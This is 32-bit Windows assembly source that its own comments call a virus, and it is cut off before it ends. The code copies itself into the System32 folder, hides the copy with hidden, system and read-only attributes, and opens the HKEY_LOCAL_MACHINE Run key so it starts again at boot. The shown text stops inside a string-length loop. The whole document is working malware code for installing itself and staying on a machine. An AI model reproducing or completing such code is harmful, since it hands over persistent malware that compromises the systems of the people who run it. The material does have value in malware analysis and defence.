bits 32
%include "win32n.inc"
 
extern GetModuleHandleA
import GetModuleHandleA kernel32.dll
extern GetModuleFileNameA
import GetModuleFileNameA kernel32.dll
extern GetSystemDirectoryA
import GetSystemDirectoryA kernel32.dll
extern CopyFileA
import CopyFileA kernel32.dll
extern SetFileAttributesA
import SetFileAttributesA kernel32.dll
extern ExitProcess
import ExitProcess kernel32.dll
 
extern MessageBoxA
import MessageBoxA user32.dll
 
extern RegCreateKeyA
import RegCreateKeyA Advapi32.dll
extern RegOpenKeyExA
import RegOpenKeyExA Advapi32.dll
extern RegSetValueExA
import RegSetValueExA Advapi32.dll
extern RegCloseKey
import RegCloseKey Advapi32.dll


section .code USE32
..start:
 
    push DWORD 0x00000000
    call [GetModuleHandleA]
    mov  [Virus_Handle],eax  ;Get Handle of virus
 
    push 0x0104                ;MAX_PATH
    push DWORD Virus_Path
    push DWORD [Virus_Handle]
    call [GetModuleFileNameA] ;Get path of virus
 
    push 0x0104                   ;MAX_PATH
    push DWORD Sys_Dir
    call [GetSystemDirectoryA] ;Find System32
 
    mov  edi,Sys_Dir
    add  edi,eax
    mov  esi,Virus_Name
    cld
    repe  movsb  ;Append virus name to system32 path
 
    push DWORD 0x00000000
    push DWORD Sys_Dir
    push DWORD Virus_Path
    call [CopyFileA]    ;Copy Virus
 
    push DWORD FILE_ATTRIBUTE_ARCHIVE|FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_SYSTEM
    push DWORD Sys_Dir
    call [SetFileAttributesA] ;Set virus attributes
 
    push DWORD Key_Handle
    push DWORD KEY_SET_VALUE
    push DWORD 0x00000000
    push DWORD Run
    push DWORD HKEY_LOCAL_MACHINE
    call [RegOpenKeyExA]   ;Open Run key
 
    mov  esi,Sys_Dir    ;Calculate size of string and store in ECX
    xor  ecx,ecx

Path_Size:
    cmp  BYTE [esi],0x00
    jz  done
    inc  ecx
    inc  esi
    jmp  Path_Size